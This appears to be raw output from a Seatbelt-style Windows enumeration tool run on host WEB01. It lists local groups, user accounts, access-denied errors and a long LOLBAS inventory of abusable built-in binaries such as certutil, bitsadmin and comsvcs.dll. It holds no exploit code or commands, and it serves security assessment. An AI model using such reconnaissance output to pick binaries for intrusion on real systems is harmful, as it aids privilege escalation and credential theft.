  ** WEB01\Performance Log Users ** (Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  Unknown         S-1-5-21-2133302606-3209669538-3615740910-500\ S-1-5-21-2133302606-3209669538-3615740910-500

  ** WEB01\Performance Monitor Users ** (Members of this group can access performance counter data locally and remotely)

  WellKnownGroup  NT SERVICE\MSSQLSERVER                   S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
  WellKnownGroup  NT SERVICE\SQLSERVERAGENT                S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430

  ** WEB01\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            WEB01\DefaultAccount                     S-1-5-21-197600473-3515118913-3158175032-503

  ** WEB01\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  User            WEB01\svc_dev                            S-1-5-21-197600473-3515118913-3158175032-1003
  Group           DAEDALUS\Domain Users                    S-1-5-21-4088429403-1159899800-2753317549-513

  ** WEB01\SQLServer2005SQLBrowserUser$SQL01 ** (Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.)

  WellKnownGroup  NT SERVICE\SQLBrowser                    S-1-5-80-2488930588-2400869415-1350125619-3751000688-192790804

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 12/20/2019 4:25:15 AM
  LastLogon                      : 11/20/2024 8:40:45 AM
  NumLogins                      : 11597

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : svc_dev
  Enabled                        : True
  Rid                            : 1003
  UserType                       : User
  Comment                        :
  PwdLastSet                     : 10/13/2020 10:47:53 AM
  LastLogon                      : 3/24/2026 9:54:47 AM
  NumLogins                      : 65535

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 1/21/2020 6:04:41 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonEvents ======

ERROR: Unable to collect. Must be an administrator/in a high integrity context.
====== LogonSessions ======

Logon Sessions (via WMI)

ERROR:   [!] Terminating exception running command 'LogonSessions': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.LogonSessionsCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== LOLBAS ======

Path: C:\Windows\System32\advpack.dll
Path: C:\Windows\SysWOW64\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_d082ca37b5d3d7c3\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_dad77489ea3499be\advpack.dll
Path: C:\Windows\System32\at.exe
Path: C:\Windows\SysWOW64\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_3dc78e4edc0df1b1\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_481c38a1106eb3ac\at.exe
Path: C:\Windows\System32\AtBroker.exe
Path: C:\Windows\SysWOW64\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_c06699b6767ea3f0\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_cabb4408aadf65eb\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\f\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\r\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\f\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\r\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.1_none_3061487514bb83f7\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\f\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\r\bash.exe
Path: C:\Windows\System32\bitsadmin.exe
Path: C:\Windows\SysWOW64\bitsadmin.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_3dd77ae7649577fa\bitsadmin.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_482c253998f639f5\bitsadmin.exe
Path: C:\Windows\System32\certutil.exe
Path: C:\Windows\SysWOW64\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_a64af1d28b85fec8\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_b09f9c24bfe6c0c3\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\f\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\r\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\f\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\r\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.17763.1_none_b14d5ceb47e2e05b\CL_Invocation.ps1
Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.17763.1_none_6da811f997075340\CL_MutexVerifiers.ps1
Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
Path: C:\Windows\System32\cmd.exe
Path: C:\Windows\SysWOW64\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1_none_7bd2b0a27285f56b\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1_none_86275af4a6e6b766\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\r\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\f\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\r\cmd.exe
Path: C:\Windows\System32\cmdkey.exe
Path: C:\Windows\SysWOW64\cmdkey.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_cdad5caa35016f49\cmdkey.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_d80206fc69623144\cmdkey.exe
Path: C:\Windows\System32\cmstp.exe
Path: C:\Windows\SysWOW64\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rascmak.resources_31bf3856ad364e35_10.0.17763.1_en-us_2c0cad1684b8d27b\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_4fe62956b8aef8eb\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_5a3ad3a8ed0fbae6\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\f\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\r\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\f\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\r\cmstp.exe
Path: C:\Windows\System32\comsvcs.dll
Path: C:\Windows\SysWOW64\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_63884f12f80766f9\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_6ddcf9652c6828f4\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\f\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\r\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\f\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\r\comsvcs.dll
Path: C:\Windows\System32\control.exe
Path: C:\Windows\SysWOW64\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_8a31e32302a74069\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_94868d7537080264\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\f\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\r\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\f\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\r\control.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_75029b843b5b1af7\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_bcafd25b4fd743fd\csc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Path: C:\Windows\System32\cscript.exe
Path: C:\Windows\SysWOW64\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_392e3cfb58835d77\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_4382e74d8ce41f72\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\f\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\r\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\f\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\r\cscript.exe
Path: C:\Windows\System32\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.1_none_31b836cb32d2cbbf\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\f\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\r\desktopimgdownldr.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-c..otstrapping-service_31bf3856ad364e35_10.0.17763.1697_none_5d4186424caa7d12\f\devtoolslauncher.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-c..otstrapping-service_31bf3856ad364e35_10.0.17763.1697_none_5d4186424caa7d12\r\devtoolslauncher.exe
Path: C:\Windows\WinSxS\amd64_netfx4-dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_a43786f92b366cab\dfsvc.exe
Path: C:\Windows\WinSxS\msil_dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_069772df8b7f60fe\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
Path: C:\Windows\System32\diskshadow.exe
Path: C:\Windows\SysWOW64\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_262eee7884162127\diskshadow.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_ca1052f4cbb8aff1\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.1_none_d7fc21f9a64ab1bb\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\f\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\r\dnscmd.exe
Path: C:\Program Files\dotnet\dotnet.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_7d13786b2e2a2730\f\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_7d13786b2e2a2730\r\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_876822bd628ae92b\f\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_876822bd628ae92b\r\dxcap.exe
Path: C:\Windows\System32\esentutl.exe
Path: C:\Windows\SysWOW64\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.1_none_ca51d6e31d6a8d29\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.1_none_d4a6813551cb4f24\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\f\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\r\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\f\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\r\esentutl.exe
Path: C:\Windows\System32\eventvwr.exe
Path: C:\Windows\SysWOW64\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_e5bdc1ec5bdc8ffe\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_f0126c3e903d51f9\eventvwr.exe
Path: C:\Windows\System32\expand.exe
Path: C:\Windows\SysWOW64\expand.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_49386661b009dd04\expand.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_538d10b3e46a9eff\expand.exe
Path: C:\Program Files\internet explorer\ExtExport.exe
Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_52b5255e8688e021\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_f69689dace2b6eeb\ExtExport.exe
Path: C:\Windows\System32\extrac32.exe
Path: C:\Windows\SysWOW64\extrac32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_cbef84845c0ecfaa\extrac32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_d6442ed6906f91a5\extrac32.exe
Path: C:\Windows\System32\findstr.exe
Path: C:\Windows\SysWOW64\findstr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_17f57547b1de1380\findstr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_224a1f99e63ed57b\findstr.exe
Path: C:\Windows\System32\forfiles.exe
Path: C:\Windows\SysWOW64\forfiles.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_45e9598535b23646\forfiles.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_503e03d76a12f841\forfiles.exe
Path: C:\Windows\System32\ftp.exe
Path: C:\Windows\SysWOW64\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_9db147d5b0b369b2\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_a805f227e5142bad\ftp.exe
Path: C:\Windows\System32\gpscript.exe
Path: C:\Windows\SysWOW64\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_55dd2267c7d5aee9\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_6031ccb9fc3670e4\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\f\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\r\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\f\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\r\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\f\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\r\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\f\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\r\gpscript.exe
Path: C:\Windows\hh.exe
Path: C:\Windows\SysWOW64\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1_none_b91be097dce5e710\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1_none_c3708aea1146a90b\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\f\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\r\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\f\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\r\hh.exe
Path: C:\Windows\System32\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\r\ie4uinit.exe
Path: C:\Windows\System32\IEAdvpack.dll
Path: C:\Windows\SysWOW64\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_f3a9af329191e4a6\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_978b13aed9347370\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_5dfa66e22bfd5c70\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_a5a79db940798576\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
Path: C:\Windows\System32\InfDefaultInstall.exe
Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_5d5a6da4f438d5f5\InfDefaultInstall.exe
